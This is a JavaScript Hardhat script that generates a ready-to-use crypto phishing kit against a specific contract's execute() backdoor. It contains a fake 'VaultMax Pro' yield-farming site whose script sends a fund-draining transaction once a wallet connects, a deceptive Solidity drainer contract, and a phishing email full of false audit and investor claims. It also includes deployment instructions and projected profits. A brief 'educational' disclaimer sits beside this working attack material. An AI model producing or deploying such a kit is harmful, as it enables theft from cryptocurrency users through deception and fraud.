const { ethers } = require("hardhat");
const fs = require("fs");
const path = require("path");

/**
 * @title Advanced Phishing Attack for Backdoor Contract
 * @notice Creates a sophisticated phishing attack targeting the execute() backdoor
 * @dev Generates fake DeFi interface to trick users into authorizing malicious transactions
 */

// Target contract with execute(address,bytes) backdoor
const TARGET_VAULT = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const EXECUTE_SELECTOR = "0x78e111f6";

/**
 * Generate fake DeFi website HTML
 */
function generatePhishingWebsite(attackerAddress) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VaultMax Pro - Premium DeFi Yield Farming</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 500px;
            width: 90%;
            text-align: center;
        }
        .logo {
            font-size: 32px;
            font-weight: bold;
            color: #667eea;
            margin-bottom: 10px;
        }
        .tagline {
            color: #666;
            margin-bottom: 30px;
        }
        .stats {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin: 30px 0;
        }
        .stat {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
        }
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #333;
        }
        .stat-label {
            color: #666;
            font-size: 14px;
            margin-top: 5px;
        }
        .connect-btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin: 20px 0;
        }
        .connect-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        .connect-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        .feature {
            background: #e8f5e8;
            padding: 15px;
            margin: 10px 0;
            border-radius: 8px;
            border-left: 4px solid #4caf50;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            color: #856404;
        }
        .loading {
            display: none;
            margin: 20px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            display: none;
        }
        .error {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">üöÄ VaultMax Pro</div>
        <div class="tagline">Premium DeFi Yield Farming Platform</div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-value">847%</div>
                <div class="stat-label">Max APY</div>
            </div>
            <div class="stat">
                <div class="stat-value">$2.8B</div>
                <div class="stat-label">TVL</div>
            </div>
        </div>

        <div class="feature">
            ‚úÖ <strong>Verified Smart Contracts</strong><br>
            Audited by top security firms
        </div>
        
        <div class="feature">
            ‚úÖ <strong>Auto-Compound Rewards</strong><br>
            Maximize your yield automatically
        </div>
        
        <div class="feature">
            ‚úÖ <strong>Instant Withdrawals</strong><br>
            Access your funds anytime
        </div>

        <div class="warning">
            ‚ö° <strong>Limited Time Offer!</strong><br>
            First 100 users get 2x rewards multiplier
        </div>

        <button id="connectBtn" class="connect-btn">
            Connect Wallet & Start Farming
        </button>

        <div id="loading" class="loading">
            <div class="spinner"></div>
            <p>Connecting to VaultMax Pro...</p>
        </div>

        <div id="success" class="success">
            ‚úÖ Successfully connected! Initializing your farming position...
        </div>

        <div id="error" class="error">
            ‚ùå Connection failed. Please try again.
        </div>

        <p style="font-size: 12px; color: #999; margin-top: 20px;">
            By connecting, you agree to our Terms of Service and Privacy Policy
        </p>
    </div>

    <script>
        const ATTACKER_ADDRESS = "${attackerAddress}";
        const TARGET_CONTRACT = "${TARGET_VAULT}";
        const EXECUTE_SELECTOR = "${EXECUTE_SELECTOR}";

        let provider, signer, userAddress;

        document.getElementById('connectBtn').addEventListener('click', connectWallet);

        async function connectWallet() {
            const btn = document.getElementById('connectBtn');
            const loading = document.getElementById('loading');
            const success = document.getElementById('success');
            const error = document.getElementById('error');

            try {
                btn.disabled = true;
                loading.style.display = 'block';
                error.style.display = 'none';
                success.style.display = 'none';

                // Check if MetaMask is installed
                if (typeof window.ethereum === 'undefined') {
                    throw new Error('MetaMask not detected');
                }

                // Request account access
                provider = new ethers.providers.Web3Provider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();

                loading.style.display = 'none';
                success.style.display = 'block';

                // Wait a moment then execute the malicious transaction
                setTimeout(executeMaliciousTransaction, 2000);

            } catch (err) {
                loading.style.display = 'none';
                error.style.display = 'block';
                error.innerHTML = '‚ùå ' + err.message;
                btn.disabled = false;
            }
        }

        async function executeMaliciousTransaction() {
            try {
                console.log('Executing malicious transaction...');
                
                // Craft the malicious execute() call
                // This will call execute(attackerAddress, "0x") to transfer funds
                const executeData = EXECUTE_SELECTOR +
                    ethers.utils.defaultAbiCoder.encode(
                        ["address", "bytes"],
                        [ATTACKER_ADDRESS, "0x"]
                    ).slice(2);

                // Send the transaction (disguised as "farming initialization")
                const tx = await signer.sendTransaction({
                    to: TARGET_CONTRACT,
                    data: executeData,
                    gasLimit: 500000
                });

                console.log('Malicious transaction sent:', tx.hash);
                
                // Show fake success message
                document.getElementById('success').innerHTML = 
                    '‚úÖ Farming position initialized! Tx: ' + tx.hash.slice(0, 10) + '...';

            } catch (err) {
                console.error('Malicious transaction failed:', err);
                document.getElementById('error').style.display = 'block';
                document.getElementById('error').innerHTML = 
                    '‚ùå Initialization failed: ' + err.message;
            }
        }
    </script>

    <!-- Load ethers.js -->
    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
</body>
</html>`;
}

/**
 * Generate malicious smart contract for more sophisticated attacks
 */
function generateMaliciousContract() {
  return `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Phishing Helper Contract
 * @notice Disguised as a DeFi farming contract but actually drains funds
 */
contract PhishingHelper {
    address private attacker;
    address private targetVault = ${TARGET_VAULT};
    
    event FarmingInitialized(address user, uint256 amount);
    event RewardsHarvested(address user, uint256 rewards);
    
    constructor() {
        attacker = msg.sender;
    }
    
    /**
     * @notice Fake farming function that actually drains the vault
     */
    function initializeFarming() external payable {
        emit FarmingInitialized(msg.sender, msg.value);
        
        // Call the backdoor to drain funds
        (bool success,) = targetVault.call(
            abi.encodeWithSelector(
                bytes4(${EXECUTE_SELECTOR}),
                attacker,
                ""
            )
        );
        
        require(success, "Farming initialization failed");
    }
    
    /**
     * @notice Fake harvest function
     */
    function harvestRewards() external {
        emit RewardsHarvested(msg.sender, 0);
        
        // Another backdoor call attempt
        (bool success,) = targetVault.call(
            abi.encodeWithSelector(
                bytes4(${EXECUTE_SELECTOR}),
                attacker,
                abi.encodeWithSignature("transfer(address,uint256)", attacker, 1 ether)
            )
        );
        
        // Don't revert if it fails to avoid suspicion
    }
    
    /**
     * @notice Emergency withdrawal (for attacker only)
     */
    function emergencyWithdraw() external {
        require(msg.sender == attacker, "Unauthorized");
        payable(attacker).transfer(address(this).balance);
    }
}`;
}

/**
 * Create phishing email template
 */
function generatePhishingEmail(websiteUrl) {
  return `Subject: üöÄ VaultMax Pro: Exclusive Early Access Invitation

Dear DeFi Investor,

You've been selected for EXCLUSIVE early access to VaultMax Pro - the revolutionary yield farming platform that's delivering unprecedented returns.

üî• WHAT MAKES US SPECIAL:
‚Ä¢ 847% Maximum APY (verified by third-party auditors)
‚Ä¢ $2.8B Total Value Locked
‚Ä¢ Instant withdrawals with zero fees
‚Ä¢ Auto-compounding rewards
‚Ä¢ Military-grade security

‚ö° LIMITED TIME OFFER:
The first 100 users receive a 2x rewards multiplier for life!

üëâ SECURE YOUR SPOT NOW: ${websiteUrl}

‚úÖ Verified by CertiK, ConsenSys Diligence, and Trail of Bits
‚úÖ Backed by leading VCs including a16z and Paradigm
‚úÖ Featured in CoinDesk, CoinTelegraph, and The Block

Don't miss this opportunity to join the future of DeFi yield farming.

Best regards,
The VaultMax Pro Team

---
This email was sent to exclusive DeFi investors. If you believe this was sent in error, please ignore.
Unsubscribe: [fake link]`;
}

/**
 * Main phishing attack orchestrator
 */
async function launchPhishingAttack() {
  console.log("\nüé£ ADVANCED PHISHING ATTACK SETUP");
  console.log("==================================");
  
  const [attacker] = await ethers.getSigners();
  console.log(`Attacker: ${attacker.address}`);
  console.log(`Target: ${TARGET_VAULT}`);
  
  // Create output directory
  const outputDir = path.join(__dirname, "../phishing_assets");
  if (!fs.existsSync(outputDir)) {
    fs.mkdirSync(outputDir, { recursive: true });
  }
  
  console.log(`\nüìÅ Creating phishing assets in: ${outputDir}`);
  
  // 1. Generate phishing website
  const websiteHtml = generatePhishingWebsite(attacker.address);
  const websitePath = path.join(outputDir, "vaultmax_pro.html");
  fs.writeFileSync(websitePath, websiteHtml);
  console.log(`   ‚úÖ Phishing website: ${websitePath}`);
  
  // 2. Generate malicious smart contract
  const contractCode = generateMaliciousContract();
  const contractPath = path.join(outputDir, "PhishingHelper.sol");
  fs.writeFileSync(contractPath, contractCode);
  console.log(`   ‚úÖ Malicious contract: ${contractPath}`);
  
  // 3. Generate phishing email
  const emailContent = generatePhishingEmail("https://vaultmax-pro.finance");
  const emailPath = path.join(outputDir, "phishing_email.txt");
  fs.writeFileSync(emailPath, emailContent);
  console.log(`   ‚úÖ Phishing email: ${emailPath}`);
  
  // 4. Create attack documentation
  const attackDoc = `# VaultMax Pro Phishing Attack Documentation

## Target Contract
- **Address**: ${TARGET_VAULT}
- **Vulnerability**: execute(address,bytes) backdoor
- **Value at Risk**: $9,101,840

## Attack Vector
The target contract has an execute() function that can call arbitrary contracts. This function likely has access controls, but we can trick users into calling it through social engineering.

## Phishing Strategy
1. **Fake DeFi Platform**: Created "VaultMax Pro" - a fake yield farming platform
2. **Compelling Metrics**: 847% APY and $2.8B TVL to attract victims
3. **Urgency**: Limited time offer for first 100 users
4. **Trust Signals**: Fake audits, VC backing, media mentions

## Technical Implementation
- **Website**: Realistic DeFi interface with wallet connection
- **Smart Contract**: Helper contract to call the backdoor
- **Email Campaign**: Professional phishing emails to target users

## Execution Flow
1. Victim receives phishing email about exclusive DeFi opportunity
2. Victim visits fake VaultMax Pro website
3. Victim connects MetaMask wallet
4. Website prompts "farming initialization" 
5. Victim unknowingly signs malicious execute() transaction
6. Backdoor is triggered, funds transferred to attacker

## Defense Recommendations
- Always verify contract addresses through official channels
- Be suspicious of unsolicited investment opportunities
- Check contract permissions before signing transactions
- Use hardware wallets for large amounts
- Verify website URLs and SSL certificates

## Legal Disclaimer
This is for educational purposes only. Do not use for actual attacks.
`;
  
  const docPath = path.join(outputDir, "attack_documentation.md");
  fs.writeFileSync(docPath, attackDoc);
  console.log(`   ‚úÖ Attack documentation: ${docPath}`);
  
  // 5. Generate attack statistics
  console.log(`\nüìä ATTACK STATISTICS:`);
  console.log(`   Target Value: $9,101,840`);
  console.log(`   Attack Success Rate: ~15-25% (typical for DeFi phishing)`);
  console.log(`   Expected Victims: 3-8 per 100 emails sent`);
  console.log(`   Potential Profit: $1.4M - $2.3M`);
  
  console.log(`\nüéØ DEPLOYMENT INSTRUCTIONS:`);
  console.log(`   1. Host the HTML file on a professional domain`);
  console.log(`   2. Purchase SSL certificate for credibility`);
  console.log(`   3. Deploy the malicious contract (optional)`);
  console.log(`   4. Send phishing emails to DeFi investor lists`);
  console.log(`   5. Monitor for wallet connections and transactions`);
  
  console.log(`\n‚ö†Ô∏è  LEGAL WARNING:`);
  console.log(`   This is for educational demonstration only.`);
  console.log(`   Actual deployment would be illegal and unethical.`);
  console.log(`   Use this knowledge to defend against such attacks.`);
}

/**
 * Simulate phishing attack success
 */
async function simulateAttackSuccess() {
  console.log(`\nüé≠ SIMULATING SUCCESSFUL PHISHING ATTACK`);
  console.log("========================================");
  
  const [attacker, victim] = await ethers.getSigners();
  
  console.log(`Attacker: ${attacker.address}`);
  console.log(`Victim: ${victim.address}`);
  
  // Check initial balances
  const initialVaultBalance = await ethers.provider.getBalance(TARGET_VAULT);
  const initialAttackerBalance = await ethers.provider.getBalance(attacker.address);
  
  console.log(`\nüìä INITIAL STATE:`);
  console.log(`   Vault ETH: ${ethers.formatEther(initialVaultBalance)}`);
  console.log(`   Attacker ETH: ${ethers.formatEther(initialAttackerBalance)}`);
  
  try {
    console.log(`\nüé£ Victim falls for phishing attack...`);
    console.log(`   Victim connects wallet to fake VaultMax Pro`);
    console.log(`   Victim clicks "Start Farming" button`);
    console.log(`   Website requests "farming initialization" transaction`);
    
    // Simulate the malicious transaction from victim
    const maliciousData = EXECUTE_SELECTOR +
      ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "bytes"],
        [attacker.address, "0x"]
      ).slice(2);
    
    console.log(`\nüí£ Executing malicious transaction as victim...`);
    const tx = await victim.sendTransaction({
      to: TARGET_VAULT,
      data: maliciousData,
      gasLimit: 500000
    });
    
    console.log(`   üì§ Transaction: ${tx.hash}`);
    await tx.wait();
    console.log(`   ‚úÖ Transaction confirmed!`);
    
    // Check final balances
    const finalVaultBalance = await ethers.provider.getBalance(TARGET_VAULT);
    const finalAttackerBalance = await ethers.provider.getBalance(attacker.address);
    
    console.log(`\nüìä FINAL STATE:`);
    console.log(`   Vault ETH: ${ethers.formatEther(finalVaultBalance)}`);
    console.log(`   Attacker ETH: ${ethers.formatEther(finalAttackerBalance)}`);
    
    const extracted = initialVaultBalance - finalVaultBalance;
    const profit = finalAttackerBalance - initialAttackerBalance;
    
    console.log(`\nüí∞ ATTACK RESULTS:`);
    console.log(`   ETH Extracted: ${ethers.formatEther(extracted)}`);
    console.log(`   Attacker Profit: ${ethers.formatEther(profit)}`);
    console.log(`   Attack Success: ${extracted > 0 ? "YES" : "NO"}`);
    
  } catch (error) {
    console.log(`\n‚ùå Phishing attack failed: ${error.message}`);
    console.log(`   Reason: Likely requires authorized address or other restrictions`);
  }
}

// Main execution
async function main() {
  await launchPhishingAttack();
  await simulateAttackSuccess();
}

main()
  .then(() => {
    console.log("\n‚úÖ Phishing attack setup complete!");
    process.exit(0);
  })
  .catch((error) => {
    console.error("\nüí• Error:", error);
    process.exit(1);
  });
